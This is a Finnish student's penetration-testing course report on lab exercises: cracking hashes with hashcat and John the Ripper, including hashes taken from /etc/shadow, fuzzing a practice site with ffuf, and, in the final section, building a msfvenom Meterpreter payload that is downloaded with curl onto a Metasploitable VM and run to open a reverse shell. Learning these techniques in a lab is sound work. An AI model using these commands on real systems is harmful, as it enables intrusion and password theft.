# h4 - Marraskuu2024!
## x) Lue ja tiivistä
**Karvinen 2022:**
- Karvisen artikkelissa kerrotaan siitä kuinka salasana hasheja voi murtaa Hashcatin avulla.
- Artikkelissa on asennusohjeet ja tietoa siitä kuinka identifioida hash-tyyppi.
- Lopuksi myös ohjeet murtamiseen ja Hashcatin tulosten analysointiin.

**Karvinen 2023:**
- Karvisen artikkelissa kerrotaan miten John the Ripperiä käytetään.
- Artikkeli sisältää asennusohjeet ja tehtävän salasanasuojatun ZIP-tiedoston murtoon.

**Santos et al 2017:**
- Videokokonaisuus hyökkäysten estämisestä ja korjauksesta.
- Salasanat täytyy pitää suojattuna varastoinissa sekä liikkeessä.
- Julkisten paikkojen Wifi-yhteyksien liikenne on harvoin salattua.
    - Helppo nuuhkia salasanoja.
- Salasanojen murtaminen nykyään helppoa johtuen laskentatehon noususta ja siitä, että ihmisillä on edelleen heikkoja salasanoja.
- Sanakirjoja voidaan käyttää hyödyksi salasanojen murtamisessa.
- Salasanojen suojausta täytyisi parantaa.
    - Paremmat tiivisteet
    - Suolaus
    - Pidemmät ja monimutkaisemmat salasanat
    - Kaksisuuntainen vahvistus
- John the Ripper on erinomainen työkalu salasanojen murtamiseen.
- Hashcat on nopeampi kuin John the Ripper.

**Polop et al 2024:**
- Käytettäviä komentoja esimerkiksi:
    - ``msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>``
    - ``msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf``
 
## a)  Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana

Ennen tämän viikon kotitehtäviä poistin Kali virtuaalikoneen omalta koneeltani ja asensin uudelleen. Kone käyttäytyy nyt huomattavasti paremmin ja uskon sen vaikuttavan positiivisesti tämän viikon tehtävien tekoon.

Aloitetaas tehtävä asentamalla Hashcat Karvisen ohjeiden mukaisesti.

![image](https://github.com/user-attachments/assets/fc56d550-4a67-40f1-8a75-d554b56ce2de)

Luodaan uusi hakemisto *hashed* ja ladataan sinne sanakirja hakemisto *Rockyou*.

![image](https://github.com/user-attachments/assets/ea4e68dd-6732-4d7b-a5a5-e0028f38957d)

Käytetään komentoa ``hashcat -m 0 '6b1628b016dff46e6fa35684be6acc96' rockyou.txt -o solved`` ja murretaan Hash. 

![image](https://github.com/user-attachments/assets/66a335d1-0379-458d-9509-ef0971d3712b)

Saatiin haluttu lopputulos eli salasana on summer.

![image](https://github.com/user-attachments/assets/7d0cf121-5fe4-4f50-ac64-7c05bdaebcf8)

## b) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana

Aloitetaan asentamalla John the Ripper ohjeiden mukaisesti.

![image](https://github.com/user-attachments/assets/58e1a5d4-0bc1-4bff-b714-f0fdf76de879)

Ladataan esimerkki ZIP-tiedosto.

![image](https://github.com/user-attachments/assets/530c3933-4d1e-46bc-b53b-76a3a9b2cfec)

Aloitin esimerkkitiedoston murtamisen mutta vastaan tuli outo ongelma.

![image](https://github.com/user-attachments/assets/5eb52371-e774-4950-9061-fc16398fea6a)

Kokeilin myös, jos kyseessä olisi väärä hakemisto. Vastaan tuli lisää ongelmia.

![image](https://github.com/user-attachments/assets/bcd7a19b-6343-4460-98dd-bbec62e5eed0)

Pyörittelin tätä tehtävää tovin verran ja nypin hiuksia päästäni, mutten keksinyt ratkaisua ongelmaan. Valitettavasti tämä osa tehtävää jää nyt kesken. Ohjeen mukaan salasanan pitäisi olla butterfly. 

## c) Fuffme

Asennetaan Fuff Karvisen ohjeiden mukaisesti. 

![image](https://github.com/user-attachments/assets/c412a70b-6fc7-43b0-9184-ba96db216fc0)

Asennetaan ohjeessa mainitut Wordlistat.

![image](https://github.com/user-attachments/assets/a390f8bb-f24e-44e2-93df-6b7586393deb)

Tämän jälkeen irrotetaan kone verkosta ja lähdetään hommiin. Testataan ensin yhteys.

![image](https://github.com/user-attachments/assets/26fbeee3-f492-4bdf-b436-a041832200e3)

Testataan kommennolla `` ffuf -w $HOME/wordlists/common.txt -u http://ffuf.me/cd/basic/FUZZ``.

![image](https://github.com/user-attachments/assets/01fae29d-a557-448f-a23e-468127acc6b7)

Kone löytää *development.log* ja *class*. 

Seuraavaksi kokeilin ``ffuf -w ~/wordlists/parameters.txt -u http://localhost/cd/basic/FUZZ``

![image](https://github.com/user-attachments/assets/3f7ddda5-828e-4e64-9299-ff9a07705620)

Tällä kertaa löytyi ainoastaan *class*. 

Kohta Subdomains, sieltäkin löytyi *class*. 

![image](https://github.com/user-attachments/assets/3e725487-4162-489d-8635-62610ed1dda7)

Tässä kohta No 404 Status ja  murto-osa sen löydöistä.

![image](https://github.com/user-attachments/assets/b8d4484d-c8d1-42dd-9599-0ce3f155745f)

Sama aihe mutta komennolla ``ffuf -w ~/wordlists/common.txt -u http://localhost/cd/no404/FUZZ -fs 669``. Vastaukseksi tuli *secret*. 

![image](https://github.com/user-attachments/assets/c2ceef0d-411e-40d3-9eff-1ca938a09dfd)

Seuraavana recursion, joka löysi *admin* ja *users*.

![image](https://github.com/user-attachments/assets/b6bfb8dd-2162-4ca1-b615-5be8c0d04186)

Nyt vuorossa File Extensions. Sieltä löytyi *users.log*.

![image](https://github.com/user-attachments/assets/ffd7b1ac-3097-4050-9739-6538586ee0cd)

Param Mining löysi *debug*.

![image](https://github.com/user-attachments/assets/c5e1a0cf-167b-4238-ad41-c4850189ccb8)

Yritin kohtaa Rate Limited 5 kertaa, mutta sain joka kerralla error viestiä. 

![image](https://github.com/user-attachments/assets/2cd9d3a0-d0ed-4fd2-a36c-a3b1249c6471)

Viimeisenä Pipes, sen täytyisi löytää *redhat* mutta tältä näyttää saamani vastaus.

![image](https://github.com/user-attachments/assets/e9bcb793-3999-4df2-abde-5f67d65af927)

## d) Tiedosto

Löysin Githubista salatun PDF-tiedoston ja aion murtaa sen. Ladataan encrypted.pdf ja tallennetaan se työpöydälle. 

![image](https://github.com/user-attachments/assets/c7456341-0486-4d4e-a86c-f75b5b1f276d)

![image](https://github.com/user-attachments/assets/7f4ab132-69b1-4bc6-8173-3ab72aaf6ebe)

Käytetään John2Pdf hyökkäystä Hash-tiedoston tekoon. Käytetään komentoa ``sudo /usr/bin/pdf2john /home/kali/Desktop/encrypted.pdf > encrypted.pdf.hash``. 

![image](https://github.com/user-attachments/assets/436d90a7-8021-4c94-a45b-31f763080c43)

Hash-teidosto näyttää tältä ja nyt se pitäisi murtaa Hashcatin avulla. 

![image](https://github.com/user-attachments/assets/3ae18b24-7fc3-4468-8e3d-1cb2520fdb50)

Tässä kohtaa otin avuksi Youtuben ja sieltä löytämäni videon, joka löytyy lähteistä.

Poistetaan sotku Hash-tiedoston alustta, että voimme murtaa sen. 

![image](https://github.com/user-attachments/assets/934bd7d0-a0d2-4eac-9ab7-e289cc3ebd11)

Tämä Hash käyttää moodia 10500. Käytetään videossa mainittua komentoa ``hashcat -m 10500 encrypted.pdf.hash /usr/share/wordlists/rockyou.txt.gz ``. 

![image](https://github.com/user-attachments/assets/bd589fba-bd23-40c6-924b-386c433d81b2)

Sain vastaukseksi, että Status on Exhausted. 
## e) Tiiviste
Menen tässä kohtaa tehtävän ehdotuksella eli luon käyttäjän ja murran sen salasanan. Lähteissä video, jota käytin apuna tehtävässä.  Luodaan käyttäjä kuje ja annetaan sen salasanaksi kuje. Kommennot  `` sudo useradd kuje`` ja ``sudo passwd kuje``.

![image](https://github.com/user-attachments/assets/e6c5c3c5-aa2f-4b0f-a349-ea56a9ed2c76)

Kujen tiiviste pitäisi löytyä kansiosta ``/etc/shadow``

![image](https://github.com/user-attachments/assets/5d3c4bf5-40be-4c35-a96a-e0b50b3df672)

Loput tiedot löytyvät kansiosta ``/etc/passwd``. 

![image](https://github.com/user-attachments/assets/e53e0248-1036-4b02-8fb7-8056e9ea8599)

Kopioidaan shadow tiedoston tiiviste työpöydälle uuteen kansioon nimeltä *shadow*. Tehdään sama myös kansiolle passwd. Lopuksi luodaan kolmas tiedosto *unshadow* ja kopioidaan sinne molemmat tiedot.

![image](https://github.com/user-attachments/assets/50808c65-be49-4580-84df-088a73f819b2)

Luodaan myös sanalista *sanalista.txt*, jossa on salasanoja, joita John the Ripper testailee.

![image](https://github.com/user-attachments/assets/80cef5cb-7d9a-4d3f-a297-d2dcc855d039)

Lopuksi ajoin komennon ``sudo john --wordlist=/usr/share/wordlists/sanalista.txt --format=crypt unshadow`` ja tämä oli vastaus. Jokin meni mönkään mutta revin jo tarpeeksi hiuksiani tämän tehtävän parissa. 

![image](https://github.com/user-attachments/assets/4a5a33e7-90ca-49cb-a365-ae8a9c0352a9)


## f) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin

Löysin Youtubesta ohjevideon ja hyödynnän sitä tätä tehtävää tehdessä. Video merkattu lähteisiin. 

Kun koneiden yhteys on varmistettu, syötin komennon ``msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.88.5 lport=5555 -f elf > reverse.elf``. 

![image](https://github.com/user-attachments/assets/1fe7e66a-6a4c-40eb-bc10-9f109b3c9a10)

Tämän jälkeen komento ``python3 -m http.server``. Se käynnistää Web serverin porttiin 8000 ja pyörittää juuri luomaa haittaohjelmaa. 

![image](https://github.com/user-attachments/assets/ee18d8e3-2bcc-4158-b6a8-ba63f644d1f4)

Tämän jälkeen avataan uusi terminaali ja avataan msfconsole ja ajetaan komento ``use exploit/multi/handler``.

![image](https://github.com/user-attachments/assets/472b2d67-cb84-4d4c-9d38-1d2fbfb863dc)

Tämän jälkeen on aika asettaa payload komennolla ``set payload linux/x86/meterpreter/reverse_tcp``. 

![image](https://github.com/user-attachments/assets/7723fcf1-f9fa-453e-b132-bd1aae00f08b)

Tämän jälkeen määrittele lhost ja anna sille Kalin IP-osoite. Kuuntelevaksi portiksi tulee 5555. Sitten komento ``exploit`` ja yhteys syntyy. 

![image](https://github.com/user-attachments/assets/80dfd6d2-073a-4dda-b706-7c191e901fc3)

Siirrytään Metasploitablen puolelle. Ja annetaan komento ``curl -o reverse.elf 192.168.88.5:8000/reverse.elf``. 

![image](https://github.com/user-attachments/assets/7858f94e-3507-4bf5-8575-535401550ed6)

Lopuksi annetaan oikeat oikeudet ja ajetaan ohjelma.

![image](https://github.com/user-attachments/assets/3817f981-14db-4554-9984-26b1fc263470)

Ja BOOM!! Reverse shell yhteys Metasploitableen on auki.

![image](https://github.com/user-attachments/assets/2954362a-8731-4d0d-9e66-b58a04eec067)

# Lähteet
Karvinen, T. 2024. Tunkeutumistestaus - Penetration Testing course - 2024 late autumn. Saatavilla: https://terokarvinen.com/tunkeutumistestaus/

Karvinen, T. 2024. h4 - Marraskuu2024!. Saatavilla: https://terokarvinen.com/tunkeutumistestaus/#h4-marraskuu2024

Karvinen, T. 2022. Cracking Passwords with Hashcat. Saatavilla: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/

Karvinen, T. 2023. Crack File Password With John. Saatavilla:  https://terokarvinen.com/2023/crack-file-password-with-john/

Santos, O. 2017. Security Penetration Testing The Art of Hacking Series LiveLessons. O'Reilly. Saatavilla: https://www.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00/

HackTricks. 2024. MSFVenom - CheatSheet. Saatavilla:  https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom

Karvinen, T. 2023. Fuffme - Install Web Fuzzing Target on Debian. Saatavilla: https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/

ByteStryke. 2023. Crack a PDF with Hashcat - Youtube. Saatavilla: https://www.youtube.com/watch?v=u8hA-DxWMNk

G MAN : Security. 2024. CRACK the Password | JOHN the Ripper Password Cracking ( 5 minutes). Saatavilla: https://www.youtube.com/watch?v=5MLprTAxYDA&t=10s

CyberOffence. 2022. Use Msfvenom to Create Reverse TCP Payload - Youtube. Saatavilla: https://www.youtube.com/watch?v=ZqWfDrD2WVY
